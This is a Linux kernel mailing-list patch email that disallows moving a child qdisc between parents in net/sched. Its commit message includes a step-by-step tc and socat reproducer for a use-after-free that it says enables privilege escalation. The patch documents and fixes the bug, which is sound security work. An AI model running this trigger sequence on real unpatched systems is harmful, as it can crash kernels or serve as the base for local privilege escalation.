Return-Path: <netdev+bounces-157432-lists+netdev=lfdr.de@vger.kernel.org>
X-Original-To: lists+netdev@lfdr.de
Delivered-To: lists+netdev@lfdr.de
Received: from ny.mirrors.kernel.org (ny.mirrors.kernel.org [IPv6:2604:1380:45d1:ec00::1])
	by mail.lfdr.de (Postfix) with ESMTPS id D9EA6A0A45F
	for <lists+netdev@lfdr.de>; Sat, 11 Jan 2025 16:15:08 +0100 (CET)
Received: from smtp.subspace.kernel.org (relay.kernel.org [52.25.139.140])
	(using TLSv1.2 with cipher ECDHE-ECDSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by ny.mirrors.kernel.org (Postfix) with ESMTPS id DBA0D16A769
	for <lists+netdev@lfdr.de>; Sat, 11 Jan 2025 15:15:06 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id D20D51B043E;
	Sat, 11 Jan 2025 15:15:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b="CoIau6mh"
X-Original-To: netdev@vger.kernel.org
Received: from mail-qv1-f49.google.com (mail-qv1-f49.google.com [209.85.219.49])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id F15F71AF0C7
	for <netdev@vger.kernel.org>; Sat, 11 Jan 2025 15:15:03 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.219.49
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1736608505; cv=none; b=genpWHbgTB5d844kTJBCgjIDHx5GWxfski1Gtz6U7DxAp1b63o0l9dsg2LegeTjw+6B4GCl+kd9x4Y5qiakIdnA+T168qKP8fb5oU+VYPB4QakVSnvPjtR5DNZ/jPbgdU52ZvpC2A/gXSNjj8FdAeQRGSl1ter7G1yDja15MJW8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1736608505; c=relaxed/simple;
	bh=CL6FEL974owd1zzvuAlyegHwkRHy9wcSq/mS/YRUasE=;
	h=From:To:Cc:Subject:Date:Message-Id:MIME-Version; b=SmAbE822oL0iQnVieJ2g1mZ3wCCVwlrB0ZOaFhvGl3Jl0V8EIFvvvfS3xm94o4Pp+PU4Ti0ENQEAL3RQSJiCtcmVhiWH5eN/C4c7+d4wQVL4AnX5yjyPK6N4N6xZsdRf2es58+ZtF6Sxosk8oq3jOM9ycYeHziWvyTp5HJRK6fA=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com; spf=none smtp.mailfrom=mojatatu.com; dkim=pass (2048-bit key) header.d=mojatatu-com.20230601.gappssmtp.com header.i=@mojatatu-com.20230601.gappssmtp.com header.b=CoIau6mh; arc=none smtp.client-ip=209.85.219.49
Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=mojatatu.com
Authentication-Results: smtp.subspace.kernel.org; spf=none smtp.mailfrom=mojatatu.com
Received: by mail-qv1-f49.google.com with SMTP id 6a1803df08f44-6d8e8445219so25641226d6.0
        for <netdev@vger.kernel.org>; Sat, 11 Jan 2025 07:15:03 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=mojatatu-com.20230601.gappssmtp.com; s=20230601; t=1736608502; x=1737213302; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to;
        bh=Zfb2Ng6NHPK2G/mR1BkrRcAtiW3o0qFP7faUbzO+Etk=;
        b=CoIau6mhB+Uw3IqYZREtodBo8zZAW4etKOke2XerxdDHDg6kRDjUK9eqL0WAkp61Bx
         hREVl2hYqJI+hxPY8mLK5yJonE720s/jhoivoIyJsNxiw0tkkAsMbLj3QWFU63PN3vpY
         cb6SVCoiCM+oQ0g8+pNRIfX5IAIumQH/gR7NHBQmMnveMP9WzfuU7KgDYfKUDCtVVvoP
         q5R5cSL5geiw49qNKESJkdvpdWAWg//0A/rtaEY0Lkn52iOFpJRLG2OMSCT9XMdLtlqO
         ambRG+lwUAO3eMjC2ioppkpJBSolrr5bs1lf+T8uCOUNqtcqD0n+jetQteBbYqXvbhe1
         S/YQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1736608502; x=1737213302;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-message-state:from:to:cc:subject:date:message-id
         :reply-to;
        bh=Zfb2Ng6NHPK2G/mR1BkrRcAtiW3o0qFP7faUbzO+Etk=;
        b=LqbpnBZ9WRZBORLa0XSrMQHlz9gDfIum1FqVK70EHqdM1CHTJ8FWTDkouwc0WVL3J5
         lRkG8yTidY0ZqWO1STxAref7bnIi7evnyCCC1Y0gc1n7bO0cDgzjvrAFHF/SO/ZDt05B
         VHpZIEXrMozp6PvraFsWpr9p9OWt+ycqxI5ErHIW7IxJmI82zIgjprrLpQ89374En/xF
         9abFYJFSO6xPIgX8KWWDZgl9jZfINKcxyVi461Aa8BQqpFtSnsjxZMKCFCKCF2o+0CIr
         YLRSJjZZkoWMW2/4XlBsWcmaTCW09GzEgunu0X4NZJERwA5j2yFBfbA2sAeoEaEQ+Imy
         8zXw==
X-Gm-Message-State: AOJu0YxBEtraX7MAjIzs9IAXjTjIUkL8rYCdz2FAnc+rjnvLkRSAY8DE
	hJRwIHoa0AI8vXM+hCFQZ3QPuJ8RWmy2cfFg7FxK0dbJi3q1us7e+9zdNnKr2TxCnOX+GiFcl0w
	=
X-Gm-Gg: ASbGncv1I0XblAitn0TQvQ1+KJ4CxknqAyiFLuSBcqNfjmlV4H3rdXz1PDVhdki8QL1
	J3e9gjSLvMFbx/uYTCr2QxvIfWppOxAvCBeEdClMYvqlHrK1J+4KsCSWO3XwbqeRjKQQrGbYn2+
	cf8t7aUwow2j6A2Q5cn841ayx75TLx8gXrykK1KRzUD2ty1UYtDhWOOJaoDIF5OCwguBodtU2uM
	oZE1rRgaeTG8KvdDLn2QnlG2n1V+/02hO76Qv8cMky4gI/jun+2XG7KYiI8tVCB1stljYqVi9gW
	LOVd2ee/pkfXIRmnk0GGQm3UPwKo2i+RAto=
X-Google-Smtp-Source: AGHT+IH6O4gJxpi1E3g8q8Qe5Z4n5Vk9WtpGy0tLFXlSHvJYvYH60KXUz4B6yh/LNFc1cjrxoc2Nbg==
X-Received: by 2002:a05:6214:570b:b0:6dc:d101:2bb2 with SMTP id 6a1803df08f44-6df9b0ee9b8mr244204516d6.0.1736608502259;
        Sat, 11 Jan 2025 07:15:02 -0800 (PST)
Received: from majuu.waya (bras-base-kntaon1621w-grc-03-76-64-65-230.dsl.bell.ca. [76.64.65.230])
        by smtp.gmail.com with ESMTPSA id 6a1803df08f44-6dfade73250sm20575546d6.79.2025.01.11.07.15.00
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 11 Jan 2025 07:15:01 -0800 (PST)
From: Jamal Hadi Salim <jhs@mojatatu.com>
To: netdev@vger.kernel.org
Cc: jiri@resnulli.us,
	xiyou.wangcong@gmail.com,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	security@kernel.org,
	nnamrec@gmail.com
Subject: [PATCH net 1/1 v3] net: sched: Disallow replacing of child qdisc from one parent to another
Date: Sat, 11 Jan 2025 10:14:55 -0500
Message-Id: <20250111151455.75480-1-jhs@mojatatu.com>
X-Mailer: git-send-email 2.34.1
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Lion Ackermann was able to create a UAF which can be abused for privilege
escalation with the following script

Step 1. create root qdisc
tc qdisc add dev lo root handle 1:0 drr

step2. a class for packet aggregation do demonstrate uaf
tc class add dev lo classid 1:1 drr

step3. a class for nesting
tc class add dev lo classid 1:2 drr

step4. a class to graft qdisc to
tc class add dev lo classid 1:3 drr

step5.
tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024

step6.
tc qdisc add dev lo parent 1:2 handle 3:0 drr

step7.
tc class add dev lo classid 3:1 drr

step 8.
tc qdisc add dev lo parent 3:1 handle 4:0 pfifo

step 9. Display the class/qdisc layout

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 limit 1000p
 qdisc drr 3: dev lo parent 1:2

step10. trigger the bug <=== prevented by this patch
tc qdisc replace dev lo parent 1:3 handle 4:0

step 11. Redisplay again the qdiscs/classes

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 1:3 root leaf 4: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
 qdisc drr 3: dev lo parent 1:2

Observe that a) parent for 4:0 does not change despite the replace request.
There can only be one parent.  b) refcount has gone up by two for 4:0 and
c) both class 1:3 and 3:1 are pointing to it.

Step 12.  send one packet to plug
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
step13.  send one packet to the grafted fifo
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))

step14. lets trigger the uaf
tc class delete dev lo classid 1:3
tc class delete dev lo classid 1:1

The semantics of "replace" is for a del/add _on the same node_ and not
a delete from one node(3:1) and add to another node (1:3) as in step10.
While we could "fix" with a more complex approach there could be
consequences to expectations so the patch takes the preventive approach of
"disallow such config".

Joint work with Lion Ackermann <nnamrec@gmail.com>
Fixes: 1da177e4c3f4 ("Linux-2.6.12-rc2")
Signed-off-by: Jamal Hadi Salim <jhs@mojatatu.com>
---
 net/sched/sch_api.c | 10 ++++++++--
 1 file changed, 8 insertions(+), 2 deletions(-)

diff --git a/net/sched/sch_api.c b/net/sched/sch_api.c
index 300430b8c4d2..79e0b5c919a9 100644
--- a/net/sched/sch_api.c
+++ b/net/sched/sch_api.c
@@ -1612,7 +1612,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 	struct nlattr *tca[TCA_MAX + 1];
 	struct net_device *dev;
 	u32 clid;
-	struct Qdisc *q, *p;
+	struct Qdisc *leaf_q, *q, *p;
 	int err;
 
 replay:
@@ -1624,7 +1624,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 
 	tcm = nlmsg_data(n);
 	clid = tcm->tcm_parent;
-	q = p = NULL;
+	leaf_q = q = p = NULL;
 
 	dev = __dev_get_by_index(net, tcm->tcm_ifindex);
 	if (!dev)
@@ -1640,6 +1640,7 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 					return -ENOENT;
 				}
 				q = qdisc_leaf(p, clid);
+				leaf_q = q;
 			} else if (dev_ingress_queue_create(dev)) {
 				q = rtnl_dereference(dev_ingress_queue(dev)->qdisc_sleeping);
 			}
@@ -1673,6 +1674,11 @@ static int tc_modify_qdisc(struct sk_buff *skb, struct nlmsghdr *n,
 					NL_SET_ERR_MSG(extack, "Invalid qdisc name");
 					return -EINVAL;
 				}
+				if (leaf_q && leaf_q->parent != q->parent) {
+					NL_SET_ERR_MSG(extack, "Invalid Parent for operation");
+					return -EINVAL;
+				}
+
 				if (q->flags & TCQ_F_INGRESS) {
 					NL_SET_ERR_MSG(extack,
 						       "Cannot regraft ingress or clsact Qdiscs");
-- 
2.34.1


